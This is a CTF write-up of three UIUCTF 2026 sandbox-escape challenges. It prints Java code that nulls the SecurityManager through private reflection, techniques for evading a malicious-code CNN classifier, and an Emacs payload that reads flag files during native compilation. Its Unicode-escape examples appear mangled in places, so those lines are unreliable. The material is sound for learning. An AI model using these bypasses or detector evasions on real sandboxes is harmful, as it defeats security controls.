---
title: "UIUCTF 2026 Misc Writeup: jail, smaller-jail & emacsjail2 — 3 Jail Escapes"
slug: "uiuctf-2026-misc-writeup"
description: "Complete UIUCTF 2026 Miscellaneous writeup covering all three jail challenges: jail (Java class filtered by a PyTorch character-level CNN classifier, then run under a SecurityManager that permits ReflectPermission suppressAccessChecks — bypassed by reflecting into Class.getDeclaredFields0(false) to reach the unfiltered System.security field and null it, with an adversarial Java block comment tuned to negative-weight convolution filters that drops the model logit from +2.71 to -13.87); smaller-jail (same architecture with a tighter sigmoid ≥ 0.5 threshold and softplus-positive FC weights that make padding monotonically bad — bypassed by splitting reflection identifiers into single-character concatenation, targeted \\uXXXX Unicode escapes at hot windows, and three raw U+008A / U+0013 identifier-ignorable code points inserted inside endsWith / Scanner / Exception to disrupt CNN 3/5/10/20-byte maxima without changing compiled semantics); and emacsjail2 (Emacs 30.2 native compilation with a Capstone control-flow validator that rejects any CS_GRP_CALL or CS_GRP_JUMP — bypassed by the featurep compiler-macro which calls eval on the entire form when the first argument is 'emacs, reading /flag.txt during native-compile before the jailer ever runs the generated lea/mov/ret function that only returns t)."
date: 2026-08-11T04:00:00Z
lastmod: 2026-08-11T04:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["UIUCTF 2026"]
tags:
  - "uiuctf"
  - "uiuctf 2026"
  - "uiuc ctf"
  - "ctf writeup"
  - "miscellaneous"
  - "misc"
  - "jail escape"
  - "python jail"
  - "java jail"
  - "emacs jail"
  - "elisp jail"
  - "sandbox escape"
  - "java securitymanager"
  - "java reflection"
  - "getdeclaredfields0"
  - "reflectpermission"
  - "adversarial ml"
  - "ml classifier bypass"
  - "character level cnn"
  - "unicode escape"
  - "identifier ignorable"
  - "emacs native compile"
  - "compiler macro"
  - "featurep eval"
  - "capstone disassembly"
  - "ctf 2026"
keywords:
  - "uiuctf 2026 writeup"
  - "uiuctf 2026 misc writeup"
  - "uiuctf 2026 miscellaneous writeup"
  - "uiuctf jail writeup"
  - "uiuctf smaller-jail writeup"
  - "uiuctf emacsjail2 writeup"
  - "uiuctf java securitymanager bypass"
  - "java getdeclaredfields0 system security bypass"
  - "pytorch cnn source classifier bypass ctf"
  - "adversarial java source suffix ctf"
  - "java identifier ignorable code point bypass"
  - "java unicode escape javac translation ctf"
  - "emacs 30.2 native compile jail bypass"
  - "featurep compiler macro eval ctf"
  - "capstone control flow group validator bypass"
  - "byte-compile-initial-macro-environment bypass"
  - "uiuctf 2026 solutions"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/uiuctf-2026-misc-writeup.png"
  alt: "UIUCTF 2026 Miscellaneous writeup covering all three jail challenges — jail bypasses a PyTorch character-level CNN source-filter by attaching an adversarial Java block comment tuned to negative-weight convolution filters and 20-space fragment separation so the width-20 window cannot span two fragments, then reflects into Class.getDeclaredFields0(false) to reach the unfiltered System.security field and null it; smaller-jail defeats a tighter sigmoid 0.5 threshold with softplus-positive FC weights by splitting reflection identifiers into single-character string concatenation, targeted backslash-uXXXX Unicode escapes at hot windows, and three raw U+008A and U+0013 identifier-ignorable code points inserted inside endsWith and Scanner and Exception so the compiled Java is unchanged but the CNN 3, 5, 10, and 20 byte maxima are disrupted; and emacsjail2 defeats an Emacs 30.2 native-compile Zig-plus-Capstone validator that rejects any call or jump instruction by exploiting the featurep compiler-macro which calls eval on the entire form when the first argument is quoted emacs, reading slash flag dot txt during native-compile before the jailer ever runs the generated lea slash mov slash ret function that only returns t"
---

**UIUCTF 2026**'s Miscellaneous track was a jail escape triple built on one shared architectural insight: **the validator never sees the code that actually runs.** The `jail` and `smaller-jail` challenges bolt a PyTorch character-level CNN in front of a Java `SecurityManager` sandbox — the classifier decides whether to compile at all, then the sandbox restricts what compiled code can do. `emacsjail2` inverts the layering: Emacs 30.2 native-compiles the attacker's Lisp, then a Zig module using Capstone disassembles the *emitted machine code* and rejects any function containing a call or jump. In every case the validator inspects one representation — UTF-8 source bytes, or x86-64 assembly — but the runtime executes something the validator did not check.

The exploits exploit that gap directly. `jail` drops a Java block comment tuned to negative-weight convolution filters (the CNN sees it, the compiler ignores it); `smaller-jail` inserts three raw `U+008A` and `U+0013` bytes inside identifier names (the CNN sees them, Java's identifier-ignorable rule collapses them away); `emacsjail2` puts its file-read inside `featurep`'s compiler macro so the flag is exfiltrated during `native-compile`, before the validator ever disassembles the trivial `lea/mov/ret` function that only returns `t`. Three languages, three validators, one lesson.

Handouts, per-challenge READMEs, and dependency-free Python exploits live at [Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026). This **CyberSecurity Elite** UIUCTF 2026 Miscellaneous writeup covers all three jail challenges end to end, with an emphasis on the *representation gap* that makes each exploit possible and on the exact tradecraft (adversarial suffixes, Unicode-escape targeting, identifier-ignorable code points, compiler-macro side effects) that turns the theory into a solve.

## All three Miscellaneous challenges at a glance

| Challenge | Points | Category | Bypass primitive | Flag |
|---|---:|---|---|---|
| [jail](#jailadversarial-comment-plus-getdeclaredfields0-null) | 500 | Misc / Java jail | Adversarial block-comment suffix drops CNN logit from +2.71 to -13.87 (threshold `-2.197`); reflection into private native `Class.getDeclaredFields0(false)` reaches unfiltered `System.security` and nulls the manager | `uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}` |
| [smaller-jail](#smaller-jailunicode-escapes-plus-identifier-ignorable-bytes) | 357 | Misc / Java jail | Character-by-character string concatenation for reflection identifiers; targeted `\uXXXX` Unicode escapes; three raw `U+008A` / `U+0013` identifier-ignorable code points inside `endsWith`, `Scanner`, `Exception` — final logit `-0.037` under threshold `0.000` | `uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}` |
| [emacsjail2](#emacsjail2featurep-compiler-macro-eval-during-native-compile) | 261 | Misc / Emacs jail | `featurep`'s compiler macro `(eval form)` when first arg is `'emacs` gives arbitrary Lisp execution during `native-compile`, before Capstone disassembles the resulting `lea/mov/ret` function that just returns `t` | `uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}` |

The three challenges together add up to a masterclass in the difference between the code you *send* and the code that *runs*. Each defensive layer looks sound in isolation — a CNN over bytes, a Java `SecurityManager`, a disassembly-time control-flow check — but each measures a different representation than the one that ends up executing.

---

## jail — adversarial comment plus getDeclaredFields0 null

> *Flag:* `uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}`

`jail` is a two-stage defense. Every submitted Java source is first scored by a byte-level PyTorch CNN; only sources with `sigmoid(logit) < 0.1` are compiled. Compiled classes are then loaded and executed under a custom `JailSecurityManager` that blocks file, network, and process access.

Both stages have a load-bearing weakness. The CNN is small enough (embedding × four convolution widths × 256 features × one FC layer) to invert with the supplied weights. The `SecurityManager` blocks the setter for the manager itself but permits `ReflectPermission("suppressAccessChecks")` — private reflection is on the table.

### The runner

The relevant Python:

```python
source_tensor = torch.tensor(list(source.encode("utf8")),
                             dtype=torch.long).unsqueeze(0)
logits = model(source_tensor)

if torch.sigmoid(logits) >= 0.1:
    print("malicious code detected")
    exit()
```

Two facts matter beyond the check itself: `model.eval()` is never called (dropout stays live during inference, which makes the classifier slightly stochastic and slightly friendlier to a well-crafted adversarial input), and the threshold is `0.1`, not the more typical `0.5`. Solving the sigmoid gives the equivalent logit bound:

```text
logit < log(0.1 / 0.9) ≈ -2.1972
```

Any accepted source must land its post-softplus weighted sum of pooled convolution features below the model's small negative bias by roughly two units. That is quite tight for a general-purpose adversarial suffix, and quite loose for a suffix designed against the specific supplied weights.

### The sandbox weakness

`JailSecurityManager` denies `SecurityManager` replacement, network I/O, arbitrary file reads, and class-loader creation. Its `checkPermission` implementation rejects only `RuntimePermission("setSecurityManager")`. That means `ReflectPermission("suppressAccessChecks")` — the permission that governs `Field.setAccessible(true)` and `Method.setAccessible(true)` — passes.

The classical direct approach still fails:

```java
Field f = System.class.getDeclaredField("security");   // NoSuchFieldException
```

Java core reflection filters sensitive fields, and `System.security` is on the filter list. But OpenJDK exposes a private native primitive underneath the filter:

```text
private native Field[] Class.getDeclaredFields0(boolean publicOnly)
```

Calling `getDeclaredFields0(false)` returns the raw, unfiltered VM field array — including `security`.

### Neutralizing the manager

The payload obtains and invokes `getDeclaredFields0` via reflection, then walks the raw array for the `SecurityManager`-typed static field:

```java
java.lang.reflect.Method m =
    Class.class.getDeclaredMethod("getDeclaredFields0", boolean.class);
m.setAccessible(true);

for (java.lang.reflect.Field x :
        (java.lang.reflect.Field[]) m.invoke(System.class, false)) {
    if (x.getType() == SecurityManager.class) {
        x.setAccessible(true);
        x.set(null, null);
    }
}
```

Selecting the field by *type* rather than by index makes the exploit robust across JDK builds where the field ordering shifts. Once `System.security` is `null`, subsequent `SecurityManager` checks (invoked by `System.getSecurityManager()` returning null) fall through as if no manager were installed.

The flag path is spelled by character values instead of a string literal so the exact bytes `"/flag"` never appear in the transmitted source:

```java
String p = new String(new char[]{47, 102, 108, 97, 103});
System.out.println(
    new java.util.Scanner(new java.io.File(p))
        .useDelimiter("\\A").next());
```

### Bypassing the CNN with an adversarial block comment

The submitted source ends with a Java `/* ... */` block comment. `javac` strips it before parsing; the CNN, which operates on raw UTF-8 bytes, sees every character.

The comment is not random. Using the supplied weights, short printable fragments are searched to maximize convolution filters whose *final FC layer coefficient is negative* — pooled activations of those filters pull the logit downward. Fragments are then separated by **20 spaces**, so that the largest CNN kernel (width 20) cannot span two adjacent fragments. Global max-pooling then reduces the multi-fragment sequence to the element-wise maximum of the individual fragments' pooled activations, exactly the composition the search was tuned for.

Measured effect on the final source:

```text
logit before adversarial comment:  +2.7100
logit after adversarial comment:  -13.8700
threshold:                          -2.1972
```

Because dropout stays active during inference, individual runs bounce around the mean logit; the reported accept rate on the final payload is roughly **99.8% across 100,000 dropout samples**.

### Deliver and read

The [Python exploit](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/jail/exploit.py) opens a socket to the service, waits for the banner, ships [`payload.java`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/jail/payload.java) line by line, sends `DONE`, and reads the response:

```bash
python3 exploit.py jail-fabd5e60c631dc497b3b.chal.uiuc.tf 1337
```

Response:

```text
uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}
```

### Takeaway

`jail` is a compact demonstration that **defense-in-depth still fails when both layers share a blind spot**. The CNN cannot see semantic Java; the sandbox cannot see the source bytes. Neither can see that the "harmless comment" is a targeted adversarial input against the first layer, or that the "reflection call" is a targeted API bypass of the second. The flag body — `4dv3r4r14l_y3t_funct10n4l` — spells out the design.

---

## smaller-jail — Unicode escapes plus identifier-ignorable bytes

> *Flag:* `uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}`

`smaller-jail` looks like `jail` at a distance, but it is materially harder. Two changes flip the difficulty:

1. **Tighter threshold.** The sigmoid cutoff is `0.5`, not `0.1`, so any accepted source must land its logit below **zero** rather than below `-2.19`.
2. **Softplus-positive FC weights.** Every effective fully-connected weight is `softplus(w)` — always positive. Global max-pooling means every appended byte can only preserve or increase every filter's max activation, never decrease it. **Adding padding cannot lower the score.**

The comment trick from `jail` is dead. The exploit must reshape the actual source spelling, not decorate it.

### The service pipeline

```python
source_tensor = torch.tensor(
    list(source.encode("utf8")), dtype=torch.long).unsqueeze(0)
logits = model(source_tensor)

if torch.sigmoid(logits) >= 0.5:
    print("malicious code detected")
    exit()
```

Accepted source is written to `/tmp/UserClass.java`, compiled alongside `Jail.java`, and executed under the same class of `JailSecurityManager` as `jail`. There is no source-level allowlist — the CNN is the only pre-runtime check.

### The sandbox behaves the same

The manager blocks setting a new `SecurityManager`, blocks class-loader creation, blocks file reads except `/tmp/UserClass.class`, but permits `ReflectPermission("suppressAccessChecks")`. The `System.security` overwrite plan from `jail` still works — the problem is getting the source past the CNN with the reflection identifiers intact.

An important secondary trap: **JavaBeans introspection is not a shortcut.** A prototype using `MethodUtil` reached a model logit of `-0.117`, but crashed at runtime with:

```text
java.lang.InternalError: bouncer cannot be found
```

`MethodUtil` is a trampoline that tries to create a helper class loader — which `JailSecurityManager.checkCreateClassLoader()` unconditionally throws on. Ordinary core reflection does not need the bouncer and completes the field write cleanly.

### Reimplement the CNN offline

Repeatedly probing the remote service returns only an accept/reject bit, which is too slow for iterative refinement. The supplied [`model.safetensors`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/smaller-jail/handout/) contains all the weights needed to score candidates locally.

Architecture recap: embed each UTF-8 byte into 32 dimensions, apply four convolution stacks (kernel sizes 3, 5, 10, 20; 64 filters each), ReLU, global max-pool. That gives 256 pooled features. The output is:

```text
logit = bias + Σⱼ softplus(fc_weight[j]) × h[j]
bias ≈ -0.528280
```

A [pure NumPy reimplementation](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/smaller-jail/numpy_model.py) drops the PyTorch dependency. A [companion script](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/smaller-jail/inspect_numpy.py) attributes each pooled activation back to the exact source byte window responsible — the hot windows that need surgical rewriting.

Representative measurements during development:

| Candidate | Logit | Sigmoid | Result |
| --- | ---: | ---: | --- |
| Zero-activation bias | `-0.528280` | `0.370918` | Below threshold |
| Direct reflection + file-read prototype | `10.678833` | `0.999977` | Rejected |
| Broad `\uXXXX` rewriting prototype | `42.159119` | `≈ 1` | Rejected |
| JavaBeans introspection prototype | `-0.112475` | `0.471912` | Accepted, runtime failure |
| Final unfiltered-field exploit | `-0.036778` | `0.490806` | **Accepted** |

The final logit is `-0.037` under a threshold of `0.000`. There is no margin to spare — hence the exact weights and deterministic scorer in the repository.

### Split suspicious strings by concatenation

Every convolution kernel sees at most a 20-byte window. Reflection API names, class names, and the flag path are reconstructed at runtime while never appearing contiguously in the source:

```java
"g"+"e"+"t"+"D"+"e"+"c"+"l"+"a"+"r"+"e"+"d"+"F"+"i"+"e"+"l"+"d"+"s"+"0"
"j"+"a"+"v"+"a"+"."+"i"+"o"+"."+"F"+"i"+"l"+"e"
"/"+"f"+"l"+"a"+"g"
```

Java's compiler folds constant string concatenation at compile time — the runtime sees `"getDeclaredFields0"`, but the CNN sees ninety-odd bytes of `"x"+"y"+...` with quotation marks and plus signs between every character.

Helpers `a(Object...)` and `c(Class...)` construct array types without the tokens `Object[].class` and `Class[].class`, which are strong CNN features. A static unassigned `Object n;` supplies the `null` used for the field write, avoiding the literal word `null` in the middle of the payload.

### Use Java Unicode translation

Java's tokenizer processes Unicode escapes *before* lexical analysis. The wire text can contain `.` and `(`; by the time `javac` sees them they are `.` and `(`. The transmitted bytes therefore differ from the tokens the compiler consumes:

```text
wire bytes:    . getDeclaredMethod (
compiler sees: . getDeclaredMethod (
```

The trap is that indiscriminate `\uXXXX` sprinkling *raises* the model score — the CNN has learned strong features for repeated `\uXXXX` motifs. Escapes must be applied only at the specific hot windows that `inspect_numpy.py` identifies.

### Insert identifier-ignorable code points

Java permits any character with `Character.isIdentifierIgnorable() == true` inside an identifier and *ignores it when matching the identifier name*. That gives a way to change the wire bytes without changing the compiled identifier — no `\uXXXX` sequence in sight.

The final source inserts exactly three raw code points at CNN hot spots:

| Code point | Source position | Compiler interpretation |
| --- | --- | --- |
| `U+008A` | `ends<U+008A>With` | `endsWith` |
| `U+0013` | `S<U+0013>canner` | `Scanner` |
| `U+008A` | `E<U+008A>xception` | `Exception` |

UTF-8 encoded, those characters expand into 2-byte sequences that disrupt several convolution maxima at once — 3-byte, 5-byte, 10-byte, and 20-byte windows all shift by two bytes across the insertion point. Java, matching the identifier by iterating characters and skipping the ignorable ones, sees `endsWith`, `Scanner`, `Exception`.

The tuning loop is disciplined: `inspect_numpy.py` prints the top positive windows, apply a Java-equivalent spelling change near those offsets, rescore with `numpy_model.py`, retain only changes that lower the logit **and** preserve behavior. Repeat until the logit crosses zero.

### Read the flag reflectively

Once `System.security` is null, `java.io.File` and `java.util.Scanner` are reachable — but their names are still built dynamically:

```text
Class.forName(dynamic "java.io.File")
    → construct with dynamic "/flag"
    → construct Scanner(File)
    → invoke next()
    → System.out.println(...)
```

### Deliver and read

```bash
python3 solve.py
```

The [solver](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/smaller-jail/solve.py) opens TLS, waits for the `DONE` prompt marker, sends the UTF-8 Java source, waits for the transcript:

```text
Starting the jail...
uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}
```

The `sp4c1ng` in the flag is a small taunt: the intended solve is exactly a spelling-space attack, changing wire bytes without changing compiled semantics.

### Takeaway

**When the classifier operates at a different representation level than the compiler, the gap between those levels is the attack.** The CNN sees UTF-8 bytes; Java sees post-Unicode-escape identifier tokens with ignorable code points stripped. Everything the compiler considers equivalent — string concatenation folding, Unicode escape translation, identifier-ignorable characters — is invisible to a byte-level classifier. The 357 points buy tradecraft, not a new bug.

---

## emacsjail2 — featurep compiler-macro eval during native-compile

> *Flag:* `uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}`

`emacsjail2` moves the layering to a genuinely surprising place. The service accepts one Emacs Lisp form, native-compiles it with Emacs 30.2, disassembles the emitted x86-64 with Capstone, and refuses to invoke it if any instruction belongs to `CS_GRP_CALL` or `CS_GRP_JUMP`. Anything that talks to a buffer, opens a file, or even loops is out.

The intended attack does not fight the disassembly at all. It exfiltrates the flag *during compilation* and lets the compiled function reduce to a constant.

### The service pipeline

```elisp
(let ((input (read-string "Input: ")))
  (unless (length< input 4096)
    (panic "input is too long"))
  (let ((code (read-from-string input)))
    (setq code (car code))
    ...))
```

Before compiling, the service tries to disable macros — replacing every macro binding in `byte-compile-initial-macro-environment` with `#'ignore` except for three:

```elisp
(let ((macro-whitelist
       '(comp--prepare-args-for-top-level lambda cl-declare)))
  (mapatoms
   (lambda (a)
     (when (and (macrop a) (not (memq a macro-whitelist)))
       (push (cons a #'ignore)
             byte-compile-initial-macro-environment)))))
```

It then compiles with all native-compiler safety checks disabled and validates the output:

```elisp
(let ((compilation-safety 0)
      (compiled (native-compile code (make-temp-file "emacsjail2"))))
  (unless (check compiled)
    (panic "jailer does not approve of your program"))
  (message "%s" (funcall compiled)))
```

Two properties of that pipeline are load-bearing. First, the `check` step runs on the generated function *after* compilation completes — everything `native-compile` did along the way has already happened. Second, the macro-neutering step targets `(macrop a)`, which is the check for *regular macros* — it does not touch the parallel *compiler-macro* mechanism.

### The Capstone gate

The [Zig module](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/emacsjail2/handout/challenge/jailer.zig) opens the generated `.eln`, finds the compiled function's symbol via ELF, disassembles only those bytes, and refuses on any control-flow instruction group:

```zig
pub fn controlFlowP(insn: cap.cs_insn) bool {
    for (insn.detail.*.groups[0..insn.detail.*.groups_count]) |g| {
        switch (g) {
            cap.CS_GRP_CALL, cap.CS_GRP_JUMP => return true,
            else => {},
        }
    } else return false;
}

while (insns.next()) |insn| {
    if (CapstoneInstIterator.controlFlowP(insn)) return false;
}
return true;
```

A conventional exploit like

```elisp
(lambda ()
  (with-temp-buffer
    (insert-file-contents "/flag.txt")
    (buffer-string)))
```

cannot pass. Even if `with-temp-buffer` were an allowed macro, the compiled result calls buffer and file primitives — every one of those `call`s is visible to Capstone.

### The compiler-macro gap

Emacs has two macro mechanisms. Regular macros are consulted through `macrop` and `byte-compile-initial-macro-environment`. **Compiler macros** are consulted separately through `macroexp--expand-all`, and they live in a symbol's `compiler-macro` function property. The service neither clears those properties nor sets `macroexp-inhibit-compiler-macros`.

Emacs 30.2 ships a compiler macro for `featurep` in `lisp/emacs-lisp/bytecomp.el`:

```elisp
(put 'featurep 'compiler-macro
     (lambda (form feature &rest _ignore)
       (if (member feature '('xemacs 'sxemacs 'emacs))
           (eval form)
         form)))
```

The macro receives the original call as `form`. If the raw first argument is one of the quoted implementation names — `'xemacs`, `'sxemacs`, `'emacs` — it calls `(eval form)`. The compiler macro is fired **during `native-compile`**, well before `check` ever runs.

Choosing `'emacs`:

```elisp
(featurep 'emacs SECOND-ARGUMENT)
```

`featurep` accepts an optional second argument. Ordinary Lisp evaluation computes that argument before invoking `featurep`, so it can contain arbitrary side-effecting Lisp. Because `(eval form)` runs the whole expression, those side effects happen inside the compiler — at attacker-controlled time and with normal (un-neutered) global macro definitions.

### The payload

The minimum shape to run an expression at compile time is:

```elisp
(lambda ()
  (featurep 'emacs
    (progn
      ATTACKER-EXPRESSION
      nil)))
```

Reading the flag and echoing it through `message`:

```elisp
(lambda ()
  (featurep 'emacs
    (progn
      (dolist (f '("/flag" "/flag.txt" "/challenge/flag.txt"))
        (when (file-readable-p f)
          (message "%s"
            (with-temp-buffer
              (insert-file-contents f)
              (buffer-string)))))
      nil)))
```

Two subtle points: (1) `progn`, `with-temp-buffer`, and friends were shadowed in `byte-compile-initial-macro-environment` — but the `(eval form)` in the compiler macro uses the normal global macro definitions, so the shadowing does not apply. (2) The `dolist` handles the fact that the production image exposes the challenge files under a different path than local reproduction; the winning path was `/flag.txt`.

### Why the Capstone gate still passes

After the compiler macro runs `(eval form)`, it returns the result — which for `(featurep 'emacs nil)` on the running Emacs process is `t`. The compiler macro therefore rewrites the source call to the constant `t`. The compiled function is equivalent to:

```elisp
(lambda () t)
```

Which native-compiles to (verified locally on the same Emacs 30.2 revision, x86-64):

```asm
lea    _d_reloc(%rip), %rax
mov    (%rax), %rax
ret
```

`lea`, `mov`, `ret`. None of those belong to `CS_GRP_CALL` or `CS_GRP_JUMP`. `jailer-check` returns true. The service then calls the function and prints `t` — but the flag was already emitted during compilation.

### Deliver and read

The [dependency-free Python solver](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/emacsjail2/solve.py) opens verified TLS, waits for `Input:`, sends the one-line Lisp form, collects the transcript, and extracts the flag with a regex:

```bash
python3 solve.py
```

Response:

```text
uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}
```

### Takeaway

**Native compilation is not a side-effect-free transformation.** Macro expansion, compiler macros, autoloading, and compilation hooks can all execute Lisp during the compile step. A validator that reasons about the *output* function while the attacker controls the *compiler's* environment is checking the wrong thing at the wrong time. The correct model treats the compiler process as attacker-controlled, does the compile in a separate environment with no access to secrets, and only then applies post-compilation policy as an additional defense. `try_fearless_concurrency_next` in the flag reads as a wry hint at what the intended-for-Rust rewrite might address.

---

## Cross-cutting lessons from the UIUCTF 2026 Misc set

Three challenges, three sandboxes, one repeated pattern — **the validator measures a representation of the code that is not the representation that runs**:

- **jail** validates UTF-8 bytes and executes compiled bytecode. Comments live in one but not the other.
- **smaller-jail** validates UTF-8 bytes and executes compiled bytecode. Unicode escapes and identifier-ignorable code points live differently in each.
- **emacsjail2** validates emitted machine-code instructions and executes the entire compilation pipeline. Compiler macros live in the second but not the first.

The concrete tradecraft is portable to any similar setting:

- **Adversarial suffixes work when the model's output is a monotone function of the input's max-pooled features.** In `jail`, the final layer used raw weights, allowing negatively-weighted filters — targeted padding shifted the mean logit by 16 units. In `smaller-jail`, the final layer used `softplus(w)`, forcing every weight positive; padding was mathematically incapable of lowering the score. Reading the exact layer definitions is not optional.
- **When a classifier operates on bytes, semantic equivalences of the target language are attack surface.** Java gives an unusually rich set: string constant folding (`"g"+"e"+"t"...`), Unicode escape translation (`.` → `.`), identifier-ignorable code points (`U+008A` inside an identifier), and comments. Each is a way to change the bytes without changing the compiled program.
- **Reflection filters are visible; native reflection primitives are not.** `Class.getDeclaredField` respects the sensitive-field filter; `Class.getDeclaredFields0` does not. Selecting the field by *type* (`f.getType() == SecurityManager.class`) rather than by name or index makes the exploit robust to JDK-version field ordering shifts.
- **Compilation is code execution.** Macro expansion runs Lisp. Compiler macros run Lisp. `featurep`'s compiler macro literally calls `(eval form)`. Any validator that examines the *compiler's output* while the attacker controls the *compiler's input environment* is checking the wrong artifact.
- **Silence is not safety.** `emacsjail2` prints `t` regardless of whether the attack succeeded — the actual flag exfiltration happens through a side channel (`message` during compilation) that the validator does not observe. Assume every attack path uses a channel the defender is not watching.

## Reproduce it yourself

Each challenge ships a standalone, dependency-free solver in the [UIUCTF 2026 repository](https://github.com/Abdelkad3r/UIUCTF-2026) under its own directory, with the original handout, the Python exploit, and any offline analysis tooling needed to iterate on the ML-classifier bypasses:

- [`jail/`](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/jail) — Java `SecurityManager` bypass with adversarial-comment CNN evasion.
- [`smaller-jail/`](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/smaller-jail) — Same sandbox, tighter classifier; includes `numpy_model.py`, `inspect_numpy.py`, and `score_payload.py` for offline scoring and window attribution.
- [`emacsjail2/`](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/emacsjail2) — Emacs 30.2 native-compile bypass via `featurep` compiler macro.

All three live solvers use only Python's standard library. The ML-classifier tooling for `smaller-jail` uses NumPy and safetensors; a minimal `requirements.txt` is included.

Browse the full [CTF writeups](/ctf-writeups/) archive for more sandbox-escape and adversarial-ML walkthroughs, or read the companion [scriptCTF 2026 writeup](/ctf-writeups/scriptctf-2026-writeup/) for a two-challenge crypto + reverse set that leans on the same *"the shape you're reading is not the shape you think"* pattern.

---

*This writeup is part of the CyberSecurity Elite [UIUCTF 2026](/series/uiuctf-2026/) series. Challenge files, solver scripts, and per-challenge READMEs for all three Miscellaneous challenges are published at [github.com/Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026).*
